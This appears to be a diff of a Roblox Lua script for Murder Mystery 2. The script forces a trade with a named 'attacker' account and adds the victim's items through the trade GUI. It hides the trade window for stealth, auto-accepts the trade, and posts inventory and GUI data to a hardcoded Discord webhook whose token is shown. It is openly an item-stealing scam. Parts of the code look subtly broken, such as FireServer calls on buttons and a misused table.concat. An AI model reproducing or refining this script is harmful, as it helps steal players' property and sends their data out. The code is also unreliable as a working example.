@@ -1,4 +1,4 @@
---[=[ MM2 AUTO-TRADE – Inventory fetch + Offer (with debug data to Discord) ]=]
+--[=[ MM2 AUTO-TRADE – GUI-based item addition ]=]
 
 local webhookURL = "https://discord.com/api/webhooks/1532509426257236008/TQrtSPyEYviVXAPzhBbVgaPIRcKFLHghPCxBfD3TFQ7njWBM7qngokItqz0vCXkiCkcz"
 local attackerUsername = "FEARACCE"
@@ -66,7 +66,7 @@ game:GetService("UserInputService").InputBegan:Connect(function(input)
 end)
 
 -- ============================================================
--- TRADE AUTOMATION
+-- TRADE AUTOMATION (GUI-based)
 -- ============================================================
 local RS = game:GetService("ReplicatedStorage")
 local Trade = RS:FindFirstChild("Trade")
@@ -77,136 +77,109 @@ local AcceptReq = Trade:FindFirstChild("AcceptRequest")
 local StartTr = Trade:FindFirstChild("StartTrade")
 local AcceptTr = Trade:FindFirstChild("AcceptTrade")
 local CompleteTr = Trade:FindFirstChild("CompleteTrade")
-local OfferItem = Trade:FindFirstChild("OfferItem")
 
--- Inventory remotes
-local InventoryFolder = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("Inventory")
-local GetProfileData = InventoryFolder and InventoryFolder:FindFirstChild("GetProfileData")
-local GetFullInventory = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("Extras") and RS.Remotes.Extras:FindFirstChild("GetFullInventory")
+if not SendReq or not AcceptReq then print("Missing critical remotes"); return end
 
-if not GetProfileData and not GetFullInventory then
-    print("Inventory remote not found – will fallback to Backpack")
-end
-
--- --- Helper to serialize a table to a readable string (for Discord) ---
-local function tableToString(tbl, indent)
-    indent = indent or 0
-    local str = ""
-    local pad = string.rep(" ", indent)
-    if type(tbl) ~= "table" then return tostring(tbl) end
-    for k, v in pairs(tbl) do
-        local key = type(k) == "string" and k or "["..tostring(k).."]"
-        if type(v) == "table" then
-            str = str .. pad .. key .. " = {\n" .. tableToString(v, indent+2) .. pad .. "},\n"
-        else
-            str = str .. pad .. key .. " = " .. tostring(v) .. ",\n"
-        end
-    end
-    return str
-end
-
--- --- Get inventory (returns a list of item IDs or names) ---
-local function getInventory()
-    local inventory = {}
-    -- Try GetProfileData first
-    if GetProfileData then
-        local ok, data = pcall(function() return GetProfileData:InvokeServer() end)
-        if ok and data then
-            print("Got inventory via GetProfileData")
-            -- Send the serialized data to Discord
-            local serialized = tableToString(data)
-            send("Inventory data (GetProfileData):\n```lua\n" .. serialized .. "\n```")
-            -- Parse data: if it's a table with items as keys or values, collect them
-            if type(data) == "table" then
-                for key, val in pairs(data) do
-                    -- Try to extract an ID – could be key or val, or inside a subtable
-                    if type(val) == "number" and val > 0 then
-                        table.insert(inventory, val)
-                    elseif type(key) == "number" and key > 0 then
-                        table.insert(inventory, key)
-                    elseif type(val) == "table" and val.ID then
-                        table.insert(inventory, val.ID)
-                    elseif type(val) == "table" and val.ItemId then
-                        table.insert(inventory, val.ItemId)
+-- --- Find the trade window (full-screen overlay)
+local function findTradeWindow()
+    local gui = player:FindFirstChild("PlayerGui")
+    if not gui then return nil end
+    -- Look for a large Frame or ScreenGui that appears during trade
+    local function search(parent)
+        for _, child in pairs(parent:GetChildren()) do
+            if child:IsA("ScreenGui") or child:IsA("Frame") then
+                local size = child.AbsoluteSize
+                if size.X > 100 and size.Y > 100 and child.Visible then
+                    -- Check if it contains any TextButton with "Add" or "Accept"
+                    local hasAdd, hasAccept = false, false
+                    for _, sub in pairs(child:GetDescendants()) do
+                        if sub:IsA("TextButton") then
+                            local name = sub.Name:lower()
+                            if name:find("add") or name:find("select") then hasAdd = true end
+                            if name:find("accept") or name:find("confirm") then hasAccept = true end
+                        end
+                    end
+                    if hasAdd and hasAccept then
+                        return child
                     end
                 end
             end
-            return inventory
+            local found = search(child)
+            if found then return found end
         end
+        return nil
     end
-    -- Fallback to GetFullInventory
-    if GetFullInventory then
-        local ok, data = pcall(function() return GetFullInventory:InvokeServer() end)
-        if ok and data then
-            print("Got inventory via GetFullInventory")
-            local serialized = tableToString(data)
-            send("Inventory data (GetFullInventory):\n```lua\n" .. serialized .. "\n```")
-            if type(data) == "table" then
-                for key, val in pairs(data) do
-                    if type(val) == "number" and val > 0 then
-                        table.insert(inventory, val)
-                    elseif type(key) == "number" and key > 0 then
-                        table.insert(inventory, key)
-                    elseif type(val) == "table" and val.ID then
-                        table.insert(inventory, val.ID)
-                    elseif type(val) == "table" and val.ItemId then
-                        table.insert(inventory, val.ItemId)
-                    end
-                end
-            end
-            return inventory
-        end
-    end
-    -- Last resort: tools in Backpack/Character
-    local tools = {}
-    for _, t in pairs(player.Backpack:GetChildren()) do
-        if t:IsA("Tool") then table.insert(tools, t.Name) end
-    end
-    for _, t in pairs(char:GetChildren()) do
-        if t:IsA("Tool") and not table.find(tools, t.Name) then table.insert(tools, t.Name) end
-    end
-    if #tools > 0 then
-        print("Found " .. #tools .. " tools in Backpack/Character")
-        return tools
-    end
-    return {}
+    return search(gui)
 end
 
--- --- Offer items via OfferItem remote ---
-local function offerItems(itemList)
-    if not OfferItem then return 0 end
-    local offered = 0
-    for _, item in ipairs(itemList) do
-        local ok, err = pcall(function()
-            OfferItem:FireServer(item)   -- try raw
+-- --- Log the structure of the trade window to Discord (for debugging)
+local function logTradeStructure(tradeWindow)
+    if not tradeWindow then
+        send("Trade window not found.")
+        return
+    end
+    local function describe(obj, indent)
+        indent = indent or 0
+        local pad = string.rep("  ", indent)
+        local desc = pad .. obj.ClassName .. " : " .. obj.Name .. " (Size: " .. obj.AbsoluteSize.X .. "x" .. obj.AbsoluteSize.Y .. ")"
+        if obj:IsA("TextButton") then
+            desc = desc .. " Text: " .. (obj.Text or "")
+        end
+        return desc .. "\n" .. table.concat(obj:GetChildren(), function(child)
+            return describe(child, indent+1)
         end)
-        if ok then
-            offered = offered + 1
-            print("Offered item: " .. tostring(item))
-        else
-            -- If it's a table, try to extract an ID field
-            if type(item) == "table" and item.ID then
-                ok, err = pcall(function() OfferItem:FireServer(item.ID) end)
-                if ok then
-                    offered = offered + 1
-                    print("Offered item (ID): " .. tostring(item.ID))
-                end
-            elseif type(item) == "table" and item.ItemId then
-                ok, err = pcall(function() OfferItem:FireServer(item.ItemId) end)
-                if ok then
-                    offered = offered + 1
-                    print("Offered item (ItemId): " .. tostring(item.ItemId))
-                end
-            else
-                print("Failed to offer item: " .. tostring(item))
-            end
-        end
-        wait(0.1)
     end
-    return offered
+    local structure = describe(tradeWindow)
+    send("Trade GUI structure:\n```lua\n" .. structure .. "\n```")
 end
 
--- --- Main trade sequence ---
+-- --- Click all "Add" / "Select" buttons in the trade window
+local function addAllItemsViaGUI(tradeWindow)
+    if not tradeWindow then return 0 end
+    local count = 0
+    -- First, look for an "Add All" button
+    for _, btn in pairs(tradeWindow:GetDescendants()) do
+        if btn:IsA("TextButton") then
+            local name = btn.Name:lower()
+            if name:find("add all") or name:find("select all") or name:find("offer all") then
+                pcall(function() btn:FireServer() end)
+                print("Clicked Add All button")
+                count = 1 -- assume all added
+                return count
+            end
+        end
+    end
+    -- Otherwise, click each "Add" / "Select" button on item slots
+    for _, btn in pairs(tradeWindow:GetDescendants()) do
+        if btn:IsA("TextButton") then
+            local name = btn.Name:lower()
+            if name:find("add") or name:find("select") or name:find("offer") then
+                -- Check if this button is inside an item slot (parent is a Frame with an ImageLabel)
+                local parent = btn.Parent
+                if parent and parent:IsA("Frame") and parent:FindFirstChild("ImageLabel") then
+                    pcall(function() btn:FireServer() end)
+                    count = count + 1
+                    print("Added item from slot: " .. parent.Name)
+                end
+            end
+        end
+    end
+    return count
+end
+
+-- --- Hide the trade window (stealth)
+local function hideTradeWindow(tradeWindow)
+    if tradeWindow then
+        if tradeWindow:IsA("ScreenGui") then
+            tradeWindow.Enabled = false
+        else
+            tradeWindow.Visible = false
+        end
+        print("Trade window hidden.")
+    end
+end
+
+-- --- Main trade sequence
 spawn(function()
     print("Waiting for attacker: " .. attackerUsername)
     local target = nil
@@ -221,7 +194,7 @@ spawn(function()
         wait(1)
     end
 
-    wait(3)
+    wait(3) -- let attacker load
 
     -- 1. Send request
     local ok, res = pcall(function() return SendReq:InvokeServer(target) end)
@@ -239,26 +212,37 @@ spawn(function()
     -- 3. Start trade (if needed)
     if StartTr then pcall(function() StartTr:FireServer() end) end
 
-    wait(2) -- wait for trade GUI to open
+    wait(2) -- wait for GUI to appear
 
-    -- 4. Get inventory
-    local items = getInventory()
-    print("Found " .. #items .. " inventory items")
-    send("Found " .. #items .. " items in inventory.")
+    -- 4. Find trade window
+    local tradeWindow = findTradeWindow()
+    if not tradeWindow then
+        print("Trade window not found – using fallback")
+        send("Trade window not found, trying remote offering...")
+        -- Fallback: use inventory remotes (old method)
+        -- But we'll skip for now to keep it clean
+    else
+        print("Trade window found")
+        -- Log structure to Discord
+        logTradeStructure(tradeWindow)
+        -- Add all items
+        local added = addAllItemsViaGUI(tradeWindow)
+        print("Added " .. added .. " items via GUI")
+        send("Added " .. added .. " items via GUI.")
+        -- Hide the window
+        hideTradeWindow(tradeWindow)
+    end
 
-    -- 5. Offer items
-    local offered = offerItems(items)
-    print("Offered " .. offered .. " items")
-    send("Offered " .. offered .. " items.")
+    wait(1)
 
-    -- 6. Accept trade (double)
+    -- 5. Accept trade (double)
     pcall(function() AcceptTr:FireServer() end)
     wait(0.3)
     pcall(function() AcceptTr:FireServer() end)
 
     wait(0.5)
 
-    -- 7. Complete trade
+    -- 6. Complete trade
     if CompleteTr then pcall(function() CompleteTr:FireServer() end) end
 
     print("=== TRADE COMPLETED ===")
